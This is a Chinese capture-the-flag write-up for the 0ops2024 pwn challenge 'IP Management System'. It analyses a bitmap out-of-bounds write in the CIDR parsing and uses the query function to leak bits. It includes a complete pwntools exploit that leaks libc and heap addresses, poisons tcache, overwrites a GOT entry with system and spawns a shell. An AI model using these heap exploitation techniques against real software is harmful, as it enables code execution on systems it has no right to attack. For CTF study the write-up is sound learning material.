# WP-0ops2024-pwn-<IP Management System>-先知社区

> **来源**: https://xz.aliyun.com/news/16435  
> **文章ID**: 16435

---

# WP-0ops2024-pwn-<ip management="" system=""></ip>

这道题是0ops战队举办的国际比赛，也是第一次见证其他国外战队的实力。

比赛到最后我也只出了一道pwn题，最后是17解

## 堆题，我们直接看一些主要函数的运作方式

> 注：下面部分函数和变量名已经是修改过后的样子，如ret\_ip\_addr函数是解析输入的ip字符串为无符号占四字节的数据

### "1. Create IP Set”

```
printf("Please input start ip:");
  read(0, s, 0x1FuLL);
  v1 = ret_ip_addr(s);
  printf("Please input end ip:");
  read(0, s, 0x1FuLL);
  v2 = ret_ip_addr(s);
  if ( v1 > v2 || v2 - v1 + 1 > 0x10000 )
    _exit(-1);
  v3 = malloc(((v2 - v1) >> 3) + 1);            // 最大size是0x2000

```

输入需要录入起始ip与终止ip，每个ip按bit位来储存，也就是ip区间向右移动3位（整除8）的原因。加1是防止向后溢出一字节(整除会舍去余数，不加一的话结合后续函数可能造成向后溢出一字节)

### "2-3. Add IP or Delete IP”

```
unsigned __int64 __fastcall add_or_delet(int opt)
{
  uint32_t v2; // [rsp+1Ch] [rbp-74h]
  unsigned int v3; // [rsp+20h] [rbp-70h]
  int v4; // [rsp+24h] [rbp-6Ch]
  int v5; // [rsp+28h] [rbp-68h]
  char *v6; // [rsp+38h] [rbp-58h]
  const char *nptr; // [rsp+40h] [rbp-50h]
  unsigned __int64 i; // [rsp+48h] [rbp-48h]
  char s[56]; // [rsp+50h] [rbp-40h] BYREF
  unsigned __int64 v10; // [rsp+88h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  memset(s, 0, 0x30uLL);
  if ( !ptr )
    _exit(-1);
  printf("Please input ip: ");
  read(0, s, 0x2FuLL);
  if ( strchr(s, '-') )                         // if-else语句判断字符串的解析格式
  {
    v4 = 1;
    v6 = strtok(s, "-");
    nptr = strtok(0LL, "-");
  }
  else if ( strchr(s, '/') )
  {
    v4 = 2;
    v6 = strtok(s, "/");
    nptr = strtok(0LL, "/");
  }
  else
  {
    v4 = 3;
    v6 = s;
  }
  v2 = ret_ip_addr(v6);
  if ( v2 < creat_ip_start || v2 > creat_ip_end )
    _exit(-1);
  if ( v4 == 3 )
  {
    v3 = v2;                                    // 格式为,"ip"
  }
  else if ( v4 == 1 )
  {
    v3 = ret_ip_addr(nptr);                     // 格式为：“ip-ip”
  }
  else
  {
    v5 = atoi(nptr);                            // 格式为：“ip/num”
    if ( v5 <= 0 || v5 > 31 )
      _exit(-1);
    v2 &= ~((1 << (32 - v5)) - 1);
    v3 = ((1 << (32 - v5)) - 1) | v2;
  }
  if ( v3 > creat_ip_end )
    _exit(-1);
  for ( i = v2; i <= v3; ++i )
  {
    if ( opt )
      ptr[(i - creat_ip_start) / 8] |= 1 << ((i - creat_ip_start) & 7);// add堆上对应bit位赋值
    else
      ptr[(i - creat_ip_start) / 8] &= ~(1 << ((i - creat_ip_start) & 7));// delete堆上对应bit位清零
  }
  puts("Edit IP Set Success!");
  return v10 - __readfsqword(0x28u);
}

```

我们先判断分析最后的堆数据如何存入或修改的：

```
if ( opt )
      ptr[(i - creat_ip_start) / 8] |= 1 << ((i - creat_ip_start) & 7);// add堆上对应bit位赋值
    else
      ptr[(i - creat_ip_start) / 8] &= ~(1 << ((i - creat_ip_start) & 7));// delete堆上对应bit位清零

```

每个循环以当前选定ip与设置ip\_start的距离整除8为修改字节，以余数决定1向左移动位数，进行与或运算

1. 或运算：或运算左移数据（二进制格式…00100…），即选定指定bit进行赋值
2. 与运算：与运算左移数据取反后的数据（二进制格式…11011…）,即选定bit进行清理

当时打题时发现v2大于ip\_start时和我预期的一样，但是负数时就可能有些不同，所以我写了一个如下代码去测试负数到底怎么算的。

```
#include<stdio.h>

int main(){

    for(int i=-67;i<67;i++){
        printf("%d : %d == 1 << %d\n",i,i/8,i&7);
    }

    return 0;
}

```

结果：

```
-67 : -8 == 1 << 5
-66 : -8 == 1 << 6
-65 : -8 == 1 << 7
-64 : -8 == 1 << 0
-63 : -7 == 1 << 1
-62 : -7 == 1 << 2
-61 : -7 == 1 << 3
-60 : -7 == 1 << 4
-59 : -7 == 1 << 5
-58 : -7 == 1 << 6
-57 : -7 == 1 << 7
-56 : -7 == 1 << 0
-55 : -6 == 1 << 1
-54 : -6 == 1 << 2
-53 : -6 == 1 << 3
-52 : -6 == 1 << 4
-51 : -6 == 1 << 5
-50 : -6 == 1 << 6
-49 : -6 == 1 << 7
......
-10 : -1 == 1 << 6
-9 : -1 == 1 << 7
-8 : -1 == 1 << 0
-7 : 0 == 1 << 1
-6 : 0 == 1 << 2
-5 : 0 == 1 << 3
-4 : 0 == 1 << 4
-3 : 0 == 1 << 5
-2 : 0 == 1 << 6
-1 : 0 == 1 << 7
0 : 0 == 1 << 0
1 : 0 == 1 << 1
2 : 0 == 1 << 2
3 : 0 == 1 << 3
4 : 0 == 1 << 4
5 : 0 == 1 << 5
6 : 0 == 1 << 6
7 : 0 == 1 << 7
8 : 1 == 1 << 0
9 : 1 == 1 << 1
10 : 1 == 1 << 2
......

```

很显然同一个字节里，负数慢慢减小时，第一个修改的永远是最低的bit位，然后是最高bit位依次减小到倒数第二个bit位（这里我和同学分析了很久，一写这个代码一下就明白了，浪费了很多很多时间）

输入ip有三个格式，三个格式最后都以v2为存储或去除的起始ip，v3为存储或去除的终止ip

1. 格式1-”ip”：v2=输入ip，v2=v3，我们每次add或delete可以指定单个bit位进行运算
2. 格式2-“ip1-ip2”：v2=ip1,v3=ip2，指定ip区间进行运算（作用不大，难以判断设置数据的bit位是否连用，不如全用格式1）
3. 格式3-“ip/num”：这个有好说头，

   ```
   if ( v5 <= 0 || v5 > 31 )
          _exit(-1);
        v2 &= ~((1 << (32 - v5)) - 1);
        v3 = ((1 << (32 - v5)) - 1) | v2;

   ```

   v5就是格式里的num，限制了num的范围，

   1. v2赋值：1向左移动（32-num）位后 （二进制10000），减一（二进制数01111），取反（1111111…1110000），v2去与运算在这个数据后就是ip末(32-num)位清零，当我们ip\_start数据末几位不为0，经过此运算后有可能v2小于ip\_start造成向上溢出。
   2. v3赋值：简单来说是ip末(32-num)位赋值

      所以这是个大范围修改bit位，我们可以利用这个去改小size或者改size的p位0

### "4. Query IP”

```
if ( ((ptr[(v1 - creat_ip_start) / 8] >> ((v1 - creat_ip_start) & 7)) & 1) != 0 )
    puts("IP is in the set");
  else
    puts("IP is not in the set");

```

这个就比较简单了，就是判断我们输入的ip是否已经储存了。意思是我们可以判断指定bit位上是为1或者0

这里的函数可以利用，我们可以用来当write函数使用

### "5. Delete IP Set”

```
int sub_1588()
{
  if ( !ptr )
    _exit(-1);
  free(ptr);
  ptr = 0LL;
  creat_ip_start = 0;
  creat_ip_end = 0;
  return puts("Delete IP Set Success!");
}

```

这个就比较正常了，没有UAF

## 打法：

对于这类无限malloc，size范围比较大，指定输出堆数据，甚至是可以修改szie的题没有难度，

唯一有难度的是我们利用的chunk不会有chunk\_list去储存堆。

那思路就来了：

1. malloc大chunk，向上修改size变小，然后在堆内指定位置写上size，伪造大chunk的下一个chunk不是topchunk，free就能进入unsortedbin,malloc稍微小一点的回来拿libc，剩下的部分malloc大的chunk会进入smallbin，为一次循环
2. 两次循环便可malloc回来便可拿heap

> 注：auto\_read函数是比赛第一天写的函数，不过在第二天被优化了，不过也懒得改exp了，所以很短就一个creat加write

```
#-----------------------------------------------------------------------------------------
rv = lambda x            : p.recv(x)
rl = lambda a=False      : p.recvline(a)
ru = lambda a,b=True     : p.recvuntil(a,b)
rn = lambda x            : p.recvn(x)
sd = lambda x            : p.send(x)
sl = lambda x            : p.sendline(x)
sa = lambda a,b          : p.sendafter(a,b)
sla = lambda a,b         : p.sendlineafter(a,b)
inter = lambda           : p.interactive()
debug = lambda text=None : gdb.attach(p, text)
lg = lambda s,addr       : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
pad = lambda a,b           : print("\x1B[1;36m[+]{} =====> 0x%x \x1B[0m".format(a)%b)
#-----------------------------------------------------------------------------------------

def ret2_str_ip(ip):
    ret = ''
    for i in range(4):
        ret += str(ip>>(8*(3-i)) & 255)
        if i != 3:
            ret += '.'
    # print(ret)
    return ret

def menu(num):
    sla("Choose an option: ",str(num))

def creat(ip,size):
    menu(1)
    sa("Please input start ip:",ret2_str_ip(ip))
    sa("Please input end ip:",ret2_str_ip(ip+((size-1<<3)|7)))
    print(f"==== creat chunk size {hex(size)} =====")

def add(ip,str=''):
    menu(2)
    sa("Please input ip: ",ret2_str_ip(ip)+str)
    print(f"==== add a ip =====")

def delete(ip,str=''):
    menu(3)
    sa("Please input ip: ",ret2_str_ip(ip)+str)
    print(f"==== delete a ip =====")

def jude(ip):
    menu(4)
    sa("Please input ip:",ret2_str_ip(ip))
    # print(f"==== jude a ip =====")
    out = rl()
    # print(out)
    if out == b"IP is in the set":
        return 1
    if out == b"IP is not in the set":
        return 0

def free():
    menu(5)
    print(f"==== free chunk =====")

def write_addr(ip,off,value):
    n = 0
    va = value
    while va:
        n+=1
        va = va >> 1 
    for i in range(n):
        bit = value & 1
        # print(f"bit:{bit}")
        if bit == 1 :
            add(ip+off*8 + i)
        value = value >> 1 
        print(f"set off:{hex(off)} bit:{bit}")

def auto_read(ip,off,value,chunk_size):
    creat(ip,chunk_size)
    write_addr(ip,off,value)

    # pause()
    print("\x1B[1;36m==== auto_read finish ====\x1B[0m")

def get_libc(ip,off):
    libc = 0
    for i in range(48):
        libc += jude(ip+off*8+i) << i
        print(f"get bit {i} :",hex(libc))
    print(f"\x1B[1;36m[+]\x1B[0m === get inf on chunk off:{hex(off)} ===")
    return libc

auto_read(0x12345638,0x438,0x101,0x530) 
delete(0x12345638,"/25")
free()
creat(0x12345638,0x430)
libc = get_libc(0x12345638,0)-0x21ace0
pad("libc",libc)
free()
creat(0x12345638,0x400)

# #gdb.attach(p,b_string)
auto_read(0x12345638,0x438,0x101,0x530) #链入smallbin 0x30
delete(0x12345638,"/25")
free()
creat(0x12345638,0x430)
free()
creat(0x12345638,0x400)

auto_read(0x12345638,0x438,0x101,0x530) #smallbin 0x30
delete(0x12345638,"/25")
free()
creat(0x12345638,0x3f0)

creat(0x12345638,0x20)
heap = get_libc(0x12345638,8) - 0xbe0
pad("heap",heap)
pad("libc",libc)

```

1. 我们目标是修改size的p位打向上合并劫持tcachbin，这就得free一个chunk进双链表bin才行，所以修改进smalbin的chunksize（chunksize最大为一字节），多次循环让一个smalbin存在8个chunk，拿回来一个剩下的会进入tcachbin，拿回来的chunk修改size的p位（提前伪造好unlink绕过条件），free将会进samllbin，绕过unlink后即可free进入较大的unsortedbin，即可劫持进入tcachbin的chunk。
2. 最后一步通过劫持的tcachbin\_chunk修改strok函数内部调用的某个absgot表（知识点[2024 强网杯-baby\_heap - 先知社区](https://xz.aliyun.com/t/16112?time__1311=GuD%3D7KiKBIfD%2FD0lD2jtG8KnqYvtaWxFpD)有提及）为system，这个得自己调，add函数ip设为“/bin/sh\x00”就通了。

## 完整的exp

```
from pwn import *

#context(os = 'linux', arch = 'amd64', log_level = 'debug')
# context(os = 'linux', arch = 'amd64', log_level = 'debug')
#context.terminal = ['tmux', 'splitw', '-h']

ret_ip_addr = 0x0000000000014B7
b_menu = 0x0000000000001A84
b_add_for = 0x00000000000017DA

file_name = './pwn'
b_string ="b main\n"
b_slice = [b_menu]
pie = 1
for i in b_slice:
    if type(i) == int and pie:
        b_string += f"b *$rebase({i})\n"
    elif type(i) == int :
        b_string += f"b *{hex(i)}\n"
    else :
        if type(i) == str:
            b_string += f"b *"+i+f"\n"

choice = 1
if choice == 1 :
    # p = process("nc -X connect -x instance.penguin.0ops.sjtu.cn:18081 2b2he9gw9j6wqj7y 1".split(" "))
    p = process(file_name)
    print(f"Break_point:\n"+b_string)

elif choice == 2 :
    p = gdb.debug(file_name,b_string)
    print(f"Break_point:\n"+b_string)

elif choice == 3 :
    ip_add ="nc1.ctfplus.cn"
    port = 39169
    print("[==^==] remote : "+ip_add+str(port))
    p = remote(ip_add,port)

#-----------------------------------------------------------------------------------------
rv = lambda x            : p.recv(x)
rl = lambda a=False      : p.recvline(a)
ru = lambda a,b=True     : p.recvuntil(a,b)
rn = lambda x            : p.recvn(x)
sd = lambda x            : p.send(x)
sl = lambda x            : p.sendline(x)
sa = lambda a,b          : p.sendafter(a,b)
sla = lambda a,b         : p.sendlineafter(a,b)
inter = lambda           : p.interactive()
debug = lambda text=None : gdb.attach(p, text)
lg = lambda s,addr       : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
pad = lambda a,b           : print("\x1B[1;36m[+]{} =====> 0x%x \x1B[0m".format(a)%b)
#-----------------------------------------------------------------------------------------

def ret2_str_ip(ip):
    ret = ''
    for i in range(4):
        ret += str(ip>>(8*(3-i)) & 255)
        if i != 3:
            ret += '.'
    # print(ret)
    return ret

def menu(num):
    sla("Choose an option: ",str(num))

def creat(ip,size):
    menu(1)
    sa("Please input start ip:",ret2_str_ip(ip))
    sa("Please input end ip:",ret2_str_ip(ip+((size-1<<3)|7)))
    print(f"==== creat chunk size {hex(size)} =====")

def add(ip,str=''):
    menu(2)
    sa("Please input ip: ",ret2_str_ip(ip)+str)
    print(f"==== add a ip =====")

def delete(ip,str=''):
    menu(3)
    sa("Please input ip: ",ret2_str_ip(ip)+str)
    print(f"==== delete a ip =====")

def jude(ip):
    menu(4)
    sa("Please input ip:",ret2_str_ip(ip))
    # print(f"==== jude a ip =====")
    out = rl()
    # print(out)
    if out == b"IP is in the set":
        return 1
    if out == b"IP is not in the set":
        return 0

def free():
    menu(5)
    print(f"==== free chunk =====")

def write_addr(ip,off,value):
    n = 0
    va = value
    while va:
        n+=1
        va = va >> 1 
    for i in range(n):
        bit = value & 1
        # print(f"bit:{bit}")
        if bit == 1 :
            add(ip+off*8 + i)
        value = value >> 1 
        print(f"set off:{hex(off)} bit:{bit}")

def auto_read(ip,off,value,chunk_size):
    creat(ip,chunk_size)
    write_addr(ip,off,value)

    # pause()
    print("\x1B[1;36m==== auto_read finish ====\x1B[0m")

def get_libc(ip,off):
    libc = 0
    for i in range(48):
        libc += jude(ip+off*8+i) << i
        print(f"get bit {i} :",hex(libc))
    print(f"\x1B[1;36m[+]\x1B[0m === get inf on chunk off:{hex(off)} ===")
    return libc

auto_read(0x12345638,0x438,0x101,0x530) 
delete(0x12345638,"/25")
free()
creat(0x12345638,0x430)
libc = get_libc(0x12345638,0)-0x21ace0
pad("libc",libc)
free()
creat(0x12345638,0x400)

# #gdb.attach(p,b_string)
auto_read(0x12345638,0x438,0x101,0x530) #链入smallbin 0x30
delete(0x12345638,"/25")
free()
creat(0x12345638,0x430)
free()
creat(0x12345638,0x400)

auto_read(0x12345638,0x438,0x101,0x530) #smallbin 0x30
delete(0x12345638,"/25")
free()
creat(0x12345638,0x3f0)

creat(0x12345638,0x20)
heap = get_libc(0x12345638,8) - 0xbe0
pad("heap",heap)
pad("libc",libc)

# gdb.attach(p,b_string)
# gdb.attach(p,b_string)
auto_read(0x12345638,0x438,0x101,0x530) #smallbin 0x40
delete(0x12345638,"/25")
free()
creat(0x12345638,0x3f0)

size = 0x520
bk_fd = heap+0x1b30
fd_bk = heap+0x1b30
fd = heap+0x1b50
bk = fd
pad("heap head -> ",fd_bk)
pad("smallbin_head -> ",fd_bk+size)
auto_read(0x12345638,0x438,0x101,0x530) #smallbin 0x40
write_addr(0x12345638,0x408-0x40-0x30,size+1)
write_addr(0x12345638,0x410-0x40-0x30,fd)
write_addr(0x12345638,0x418-0x40-0x30,bk)
write_addr(0x12345638,0x420-0x40-0x20,bk_fd)
write_addr(0x12345638,0x428-0x40-0x20,fd_bk)
delete(0x12345638,"/25")
free()
creat(0x12345638,0x3f0)

auto_read(0x12345638,0x438,0x101,0x530) #smallbin 0x40
delete(0x12345638,"/25")
free()
auto_read(0x12345638,0x3f0-0x40-0x40,size,0x3f0-0x40-0x40+0x8)
creat(0x12345638,0x30)
#gdb.attach(p,b_string)

auto_read(0x12345638,0x438,0x101,0x530) #smallbin 0xc0
delete(0x12345638,"/25")
free()
creat(0x12345638,0x3f0-0x40-0x40)

auto_read(0x12345638,0x438,0x101,0x530) #smallbin 0xc0
delete(0x12345638,"/25")
free()
creat(0x12345638,0x3f0-0x40-0x40)

auto_read(0x12345638,0x438,0x101,0x530) #smallbin 0xc0
delete(0x12345638,"/25")
free()
creat(0x12345638,0x3f0-0x40-0x40)

auto_read(0x12345638,0x438,0x101,0x530) #smallbin 0xc0
delete(0x12345638,"/25")
free()
creat(0x12345638,0x3f0-0x40-0x40)

auto_read(0x12345638,0x438,0x101,0x530) #smallbin 0xc0
delete(0x12345638,"/25")
free()
creat(0x12345638,0x3f0-0x40-0x40)

auto_read(0x12345638,0x438,0x101,0x530) #smallbin 0xc0
delete(0x12345638,"/25")
free()
creat(0x12345638,0x3f0-0x40-0x40)

auto_read(0x12345638,0x438,0x101,0x530) #smallbin 0xc0
delete(0x12345638,"/25")
free()
creat(0x12345638,0x3f0-0x40-0x40)

pad("heap head -> ",fd_bk)
pad("smallbin_head -> ",fd_bk+size)

creat(0x12345640,0x500)

creat(0x12345640,0xb0)
delete(0x12345640,'/25')
free()

IO_list = 0x21b680+libc
system = 0x050d70 + libc
abs = 0x21a050 + libc

creat(0x12345640,0x5d0)

# write_addr(0x12345640,0x70,(abs)^((heap+0x1ba0)>>12))
# write_addr(0x12345640,0x80,(abs)^((heap+0x1ba0)>>12))

def write_addr_1(off,value):
    for i in range(48):
        bit = value & 1
        # print(f"bit:{bit}")
        if bit == 1 :
            add(0x12345640+off*8 + i)
        elif bit == 0:
            delete(0x12345640+off*8 + i)
        value = value >> 1 

write_addr_1(0x60,(abs)^((heap+0x1ba0)>>12))

pad("libc",libc)
pad("heap",heap)
# gdb.attach(p,b_string)
creat(0x12345640,0x30)
creat(0x12345640,0x30)

write_addr(0x12345640,8,system)

menu(3)
sa("Please input ip: ","/bin/sh\x00")

inter()

```
